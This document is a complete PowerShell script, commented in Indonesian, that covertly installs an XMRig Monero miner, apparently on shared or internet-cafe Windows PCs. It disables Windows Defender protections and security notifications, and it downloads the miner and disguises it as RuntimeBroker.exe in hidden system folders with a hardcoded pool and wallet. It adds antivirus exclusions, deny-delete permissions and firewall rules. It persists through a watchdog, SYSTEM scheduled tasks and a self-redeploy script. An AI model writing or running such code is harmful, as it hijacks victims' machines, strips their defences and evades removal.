# ==========================================
# 1. MATIKAN TOTAL TAMENG DEFENDER & NOTIFIKASI
# ==========================================
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Set-MpPreference -EnableNetworkProtection Disabled -ErrorAction SilentlyContinue
Set-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue

Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" -Name "Enabled" -Value 0 -Force -ErrorAction SilentlyContinue

Set-Service -Name "wscsvc" -StartupType Disabled -ErrorAction SilentlyContinue
Stop-Service -Name "wscsvc" -Force -ErrorAction SilentlyContinue

# ==========================================
# 2. BYPASS FOLDER PERSONAL (GUNAKAN DIREKTORI NON-USER & NON-C JIKA ADA)
# ==========================================
$BaseDirs = @(
    "$env:ProgramData\Microsoft\Windows\Templates",
    "$env:PUBLIC\Libraries"
)

# Deteksi drive selain C untuk menghindari pembersihan partisi sistem/Deep Freeze
$OtherDrives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Name -ne "C" -and $_.Root -match '^[D-Z]:\\$' }
foreach ($Drive in $OtherDrives) {
    $DrivePath = Join-Path $Drive.Root "Microsoft\DataCache"
    $BaseDirs += $DrivePath
}

$DeployedDirs = @()
foreach ($TargetDir in $BaseDirs) {
    try {
        if (!(Test-Path $TargetDir)) {
            New-Item -ItemType Directory -Force -Path $TargetDir -ErrorAction Stop | Out-Null
        }
        $TestFile = Join-Path $TargetDir "test.tmp"
        Set-Content -Path $TestFile -Value "test" -ErrorAction Stop
        Remove-Item -Path $TestFile -Force -ErrorAction SilentlyContinue
        $DeployedDirs += $TargetDir
    } catch {
        continue
    }
}

if ($DeployedDirs.Count -eq 0) {
    $FallbackDir = Join-Path $env:TEMP "WinUpdateCache"
    if (!(Test-Path $FallbackDir)) {
        New-Item -ItemType Directory -Force -Path $FallbackDir | Out-Null
    }
    $DeployedDirs += $FallbackDir
}

$ExeName = "RuntimeBroker.exe"
$ZipPath = Join-Path $env:TEMP "up.zip"
$Pool = "gulf.moneroocean.stream:10128"
$Wallet = "42imHjeSVgSG54hiTVmeGa8evmKJ55oWYgb6np1zanx5j8eoCM4vfbN9xSua1unVEV5mZCxxs637LdmVEJMs1XMFCWsHvc1"
$ArgsList = "-o $Pool -u $Wallet -p x --tls --donate-level=1 --cpu-max-threads-hint=45 --background"

# ==========================================
# HENTIKAN PROSES LAMA DI SELURUH TARGET
# ==========================================
foreach ($Dir in $DeployedDirs) {
    $ExePathCheck = Join-Path $Dir $ExeName
    Get-CimInstance Win32_Process | Where-Object { $_.Path -eq $ExePathCheck } | ForEach-Object {
        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
    }
}
Stop-Process -Name "wscript", "powershell" -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName "RuntimeBrokerService" -Confirm:$false -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

# ==========================================
# 3. UNDUH & EKSTRAK BINER XMRIG
# ==========================================
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$DownloadUrl = "https://github.com/MoneroOcean/xmrig_setup/raw/master/xmrig.zip"
Invoke-WebRequest -Uri $DownloadUrl -OutFile $ZipPath

if (Test-Path $ZipPath) {
    Expand-Archive -Path $ZipPath -DestinationPath $env:TEMP -Force
    $ExtractedExe = Get-ChildItem -Path $env:TEMP -Filter "xmrig.exe" -Recurse | Select-Object -First 1

    if ($ExtractedExe -and (Test-Path $ExtractedExe.FullName)) {
        foreach ($Dir in $DeployedDirs) {
            $ExePath = Join-Path $Dir $ExeName
            Copy-Item -Force $ExtractedExe.FullName $ExePath

            # Kunci folder, exclusion defender & hidden attributes
            try {
                $Acl = Get-Acl $Dir
                $DenyRule = New-Object System.Security.AccessControl.FileSystemAccessRule("BUILTIN\Users", "Delete, DeleteSubdirectoriesAndFiles", "ContainerInherit,ObjectInherit", "None", "Deny")
                $Acl.AddAccessRule($DenyRule)
                Set-Acl $Dir $Acl -ErrorAction SilentlyContinue
            } catch {}

            Add-MpPreference -ExclusionPath $Dir -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionProcess $ExeName -ErrorAction SilentlyContinue
            Set-ItemProperty -Path $Dir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue

            # Whitelist Firewall
            New-NetFirewallRule -DisplayName "Runtime Broker Monitor (Outbound $Dir)" -Direction Outbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
            New-NetFirewallRule -DisplayName "Runtime Broker Monitor (Inbound $Dir)" -Direction Inbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null

            # Buat Watchdog per direktori
            $WatcherScriptPath = Join-Path $Dir "monitor.ps1"
            $ScriptBlockCode = @"
`$ExePath = "$ExePath"
`$ArgsList = "$ArgsList"

while (`$true) {
    `$Running = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Where-Object { `$_.Path -eq `$ExePath }
    if (!`$Running) {
        Start-Process -FilePath `$ExePath -ArgumentList `$ArgsList -WindowStyle Hidden
    } else {
        foreach (`$p in `$Running) {
            try {
                `$p.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle
            } catch {}
        }
    }
    Start-Sleep -Seconds 10
}
"@
            Set-Content -Path $WatcherScriptPath -Value $ScriptBlockCode -Force

            # Buat VBScript untuk Session 0 Isolation (Bypass Billing User Logoff Cleanup)
            $VbsPath = Join-Path $Dir "run.vbs"
            $VbsScriptContent = @"
Dim shell
Set shell = CreateObject("Wscript.Shell")
shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$WatcherScriptPath""", 0, False
"@
            Set-Content -Path $VbsPath -Value $VbsScriptContent -Force
            Add-MpPreference -ExclusionPath $VbsPath -ErrorAction SilentlyContinue

            # Jalankan langsung
            Start-Process -FilePath $ExePath -ArgumentList $ArgsList -WindowStyle Hidden
        }
    }

    Remove-Item -Force $ZipPath -ErrorAction SilentlyContinue

    # ==========================================
    # 4. AUTO REDEPLOY (BYPASS PEMBERSIHAN DISKLESS / REBOOT)
    # ==========================================
    $RedeployDir = "$env:ProgramData\Microsoft\Windows\UacSupport"
    if (!(Test-Path $RedeployDir)) {
        New-Item -ItemType Directory -Force -Path $RedeployDir | Out-Null
    }
    $RedeployScriptPath = Join-Path $RedeployDir "system_redeploy.ps1"

    $RedeployCode = @"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
\$TargetCheck = "$($DeployedDirs[0])\RuntimeBroker.exe"
if (!(Test-Path \$TargetCheck)) {
    \$Zip = "\$env:TEMP\up.zip"
    try {
        Invoke-WebRequest -Uri "$DownloadUrl" -OutFile \$Zip -ErrorAction Stop
        Expand-Archive -Path \$Zip -DestinationPath \$env:TEMP -Force
        \$Ext = Get-ChildItem -Path \$env:TEMP -Filter "xmrig.exe" -Recurse | Select-Object -First 1
        if (\$Ext) {
            foreach (\$d in @("$($DeployedDirs -join '";"')")) {
                if (\$d) {
                    if (!(Test-Path \$d)) { New-Item -ItemType Directory -Force -Path \$d | Out-Null }
                    Copy-Item -Force \$Ext.FullName (Join-Path \$d "RuntimeBroker.exe")
                }
            }
        }
        Remove-Item -Force \$Zip -ErrorAction SilentlyContinue
    } catch {}
}
"@
    Set-Content -Path $RedeployScriptPath -Value $RedeployCode -Force
    Add-MpPreference -ExclusionPath $RedeployScriptPath -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $RedeployDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue

    # ==========================================
    # 5. TASK SCHEDULER SESSION 0 ISOLATION (RUN WHETHER USER LOGGED ON OR NOT)
    # ==========================================
    $PrimaryVbs = Join-Path $DeployedDirs[0] "run.vbs"
    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$PrimaryVbs`""
    $Trigger = @(
        (New-ScheduledTaskTrigger -AtStartup),
        (New-ScheduledTaskTrigger -AtLogOn)
    )
    # Menggunakan NT AUTHORITY\SYSTEM agar terisolasi dari sesi user billing dan tidak ikut tertutup saat logoff
    $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType Service -RunLevel Highest
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 3
    
    Register-ScheduledTask -TaskName "RuntimeBrokerService" -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null

    # Task Scheduler Auto-Redeploy Startup
    $RedeployAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$RedeployScriptPath`""
    Register-ScheduledTask -TaskName "SystemHealthCheckTask" -Action $RedeployAction -Trigger (New-ScheduledTaskTrigger -AtStartup) -Principal $Principal -Settings $Settings -Force | Out-Null

    Write-Host "Setup Sempurna! Bypass Folder Personal, Sesi Billing Logoff (Session 0), & Auto-Redeploy aktif." -ForegroundColor Green
} else {
    Write-Host "Gagal mengunduh biner miner." -ForegroundColor Red
}
